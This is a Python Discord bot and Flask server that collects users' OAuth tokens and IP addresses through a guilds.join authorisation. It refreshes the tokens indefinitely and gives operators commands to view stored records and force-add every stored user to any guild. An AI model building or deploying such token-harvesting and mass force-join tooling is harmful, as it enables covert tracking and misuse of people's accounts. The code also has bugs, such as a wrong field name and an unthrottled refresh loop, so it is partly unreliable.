import threading
from colorama import Fore, Back, Style
import requests
from flask import request, Response
from flask import Flask
import discord
import pymongo
import json
from discord import Option
import time
import urllib.parse
# mongo = pymongo.MongoClient('') UNCOMMENT AND REPLACE WITH YOUR MONGO DB CONNECTION URI
intents = discord.Intents.all()
bott = discord.Bot(intents=intents)

#authorisedusers = [arrayofauthorisedids] UNCOMMENT AND REPLACE WITH YOUR AUTHORISED USER IDS

if mongo.admin.command("ping")[u"ok"] == 1.0:
    print(Fore.GREEN+"Successfully connected to MongoDB")
else:
    print(Fore.RED+"Unknown failure when connecting to MongoDB, Possibly invalid connection uri")

app = Flask(__name__)



Scopes = "&response_type=code&scope=identify%20guilds%20guilds.join%20guilds.members.read"
API_ENDPOINT = 'https://discord.com/api/v10'
#CLIENT_ID = '' UNCOMMENT AND REPLACE WITH YOUR APPLICATION'S CLIENT ID
#CLIENT_SECRET = '' UNCOMMENT AND REPLACE WITH YOUR APPLICATION'S CLIENT SECRET
#REDIRECT_URI = '' UNCOMMENT AND REPLACE WITH THE DOMAIN CURRENTLY LINKED TO YOUR IP

def exchange_code(code):
    data = {
    'client_id': CLIENT_ID,
    'client_secret': CLIENT_SECRET,
    'grant_type': 'authorization_code',
    'code': code,
    'redirect_uri': REDIRECT_URI
    }
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    r = requests.post('%s/oauth2/token' % API_ENDPOINT, data=data, headers=headers)
    return r

def refresh_token(refresh_token):
    data = {
    'client_id': CLIENT_ID,
    'client_secret': CLIENT_SECRET,
    'grant_type': 'refresh_token',
    'refresh_token': refresh_token
    }
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    r = requests.post('%s/oauth2/token' % API_ENDPOINT, data=data, headers=headers)
    return r


@app.route("/")
def registeroauth():
    if request.args.get("code"):
        ip = request.headers.get('cf-connecting-ip')
        code = request.args.get("code")
        token = exchange_code(code)
        timestamp = time.time()
        if "error" in token.json().keys():
            return Response("Invalid request", 500)
        else:
            headers = {
                'Authorization': 'Bearer '+token.json()["access_token"]
            }
            r = requests.get('https://discordapp.com/api/users/@me', headers=headers)
            check = mongo["oauthbot"]["oauth_token"].count_documents({"user_id": r.json()["id"]})
            if check > 0:
                for i in mongo["oauthbot"]["oauth_token"].find({"user_id": r.json()["id"]}):
                    mongo["oauthbot"]["oauth_token"].delete_one({"_id": i["_id"]})
                print("Purging old tokens of reverified user")
            mongo["oauthbot"]["oauth_token"].insert_one({"access_token": token.json()["access_token"], "refresh_token": token.json()["refresh_token"], "expires_at": str(timestamp+float(token.json()["expires_in"])), "user_id": r.json()["id"], "ip_addr": ip})
            return Response("Successfully registered", 200)
    else:
        return Response("Invalid request", 500)


def cronjob():
    while True:
        for i in mongo["oauthbot"]["oauth_token"].find({}):
            if float(i["expires_at"]) - 10.00 <= time.time():
                refresh = refresh_token(i["refresh_token"])
                timestamp = time.time()
                if "error" in refresh.json().keys():
                    mongo["oauthbot"]["oauth_token"].delete_one({"_id": i["_id"]})
                    print("Error when refreshing token, defaulted to deleting the token loss: -1 user.")
                else:
                    mongo["oauthbot"]["oauth_token"].delete_one({"_id": i["_id"]})
                    mongo["oauthbot"]["oauth_token"].insert_one({"access_token": refresh.json()["access_token"], "refresh_token": refresh.json()["refresh_token"], "expires_at": str(timestamp+float(refresh.json()["expires_in"])), "user_id": i["id"], "ip_addr": i["ip_addr"]})
                    print("Successfully refreshed token")


@bott.slash_command()
async def search(ctx, member:Option(discord.Member, required=False), member_id:Option(str, required=False)):
    if ctx.author.id in authorisedusers:
        if member or member_id:
            memberid = None
            if member:
                memberid = str(member.id)
            else:
                memberid = str(member_id)
            access_token = mongo["oauthbot"]["oauth_token"].find({"user_id": memberid})
            if mongo["oauthbot"]["oauth_token"].count_documents({"user_id": memberid}) > 0:
                Embed = discord.Embed(title="Search results", color=0x00ff0, description=mongo["oauthbot"]["oauth_token"].find_one({"user_id": memberid}))
                await ctx.respond(embed=Embed, ephemeral=True)
            else:
                Embed = discord.Embed(title="Search results", color=0x00ff0, description="No results found")
                await ctx.respond(embed=Embed, ephemeral=True)
        else:
            return await ctx.respond("Invalid request", ephemeral=True)
        

def getuserinfo(access_token):
    headers = {
    'Authorization': 'Bearer '+access_token
    }
    r = requests.get('https://discordapp.com/api/users/@me', headers=headers)
    return r

@bott.slash_command()
async def invitespecific(ctx, userid: Option(str, required=True)):
    if ctx.author.id in authorisedusers:
        if mongo["oauthbot"]["oauth_token"].count_documents({"user_id": userid}) > 0:
            for i in mongo["oauthbot"]["oauth_token"].find({"user_id": userid}):
                access_token = i["access_token"]
                r = forceadduser(str(ctx.guild.id),userid,access_token)
                if r.status_code == 201:
                    await ctx.respond(f"Successfully added user {userid} to guild {ctx.guild.id}", ephemeral=True)
                else:
                    await ctx.respond(f"Failed to add user {userid} to guild {ctx.guild.id}", ephemeral=True)
        else:
                    await ctx.respond(f"Failed to add user {userid} to guild {ctx.guild.id}", ephemeral=True)

@bott.slash_command()
async def stat(ctx):
    if ctx.author.id in authorisedusers:
        Embed = discord.Embed(title="Stats: Number of connected users", color=0x00ff0, description=str(mongo["oauthbot"]["oauth_token"].count_documents({})))
        await ctx.respond(embed=Embed, ephemeral=True)

@bott.slash_command()
async def getallauthed(ctx):
    if ctx.author.id in authorisedusers:
        Embed = discord.Embed(title="All authed users", color=0x00ff0)
        for i in mongo["oauthbot"]["oauth_token"].find({}):
            info = getuserinfo(i["access_token"]).json()
            if info["premium_type"] == 2:
                nitro = "Nitro"
            else:
                if info["premium_type"] == 1:
                    nitro = "Nitro Basic"
                else:
                    nitro = "None"
            Embed.add_field(name=info["username"]+"#"+info["discriminator"], value=
                            """```diff
"""+info["id"]+"""
Nitro status: """+nitro+"""```""", inline=False)
        await ctx.respond(embed=Embed, ephemeral=True)


@app.route('/getoauthurl')
def geturl():
    return ("https://discord.com/api/oauth2/authorize?client_id="+str(CLIENT_ID)+"&redirect_uri="+urllib.parse.quote(REDIRECT_URI)+Scopes).replace("\n","")

@app.route('/oauthsubscribe')
def hello():
    return "poop"

#bottoken = "" UNCOMMENT AND REPLACE WITH YOUR DISCORD BOT'S TOKEN

def initializebot():
    bott.run(bottoken)

def forceadduser(guildid, memberid, accesstoken):
    url = f"{API_ENDPOINT}/guilds/{guildid}/members/{memberid}"
    botToken = bottoken
    data = {
    "access_token" : accesstoken,
    }
    headers = {
    "Authorization" : f"Bot {botToken}",
    'Content-Type': 'application/json'
    }
    r = requests.put(url=url, headers=headers, json=data)
    return r

def revokeoauth2(access_token):
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "token": access_token
    }
    r = requests.post("https://discord.com/api/oauth2/token/revoke", headers=headers, data=data)
    return r

@bott.slash_command()
async def revokeoauth(ctx, member: Option(discord.Member, "The member you want to revoke the oauth for", required=False), member_id: Option(str, "The id of the member you want to revoke the oauth for", required=False)):
    if ctx.author.id in authorisedusers:
        if member or member_id:
            memberid = None
            if member:
                memberid = str(member.id)
            else:
                memberid = str(member_id)
            access_token = mongo["oauthbot"]["oauth_token"].find({"user_id": memberid})
            if mongo["oauthbot"]["oauth_token"].count_documents({"user_id": memberid}) > 0:
                for i in access_token:
                    access_token = i["access_token"]
                    r = revokeoauth2(access_token)
                    mongo["oauthbot"]["oauth_token"].delete_many({"user_id": memberid})
                    await ctx.respond(f"Successfully revoked oauth for {memberid}", ephemeral=True)
            else:
                await ctx.respond(f"No oauth found for {memberid}", ephemeral=True)
        else:
            await ctx.respond("Invalid request", ephemeral=True)


@bott.slash_command()
async def inviteall(ctx):
    if ctx.author.id in authorisedusers:
        amountusers = 0 
        for i in mongo["oauthbot"]["oauth_token"].find({}):
            r = forceadduser(ctx.guild_id, i["user_id"], i["access_token"])
            if r.status_code == 201:
                amountusers += 1
        embed = discord.Embed(title=f"Successfully invited {str(amountusers)} users to {ctx.guild.name}")
        await ctx.respond(embed=embed, ephemeral=True)
if __name__ == '__main__':
    threading.Thread(target=cronjob).start()
    threading.Thread(target=initializebot).start()
    app.run(host="0.0.0.0", port=80)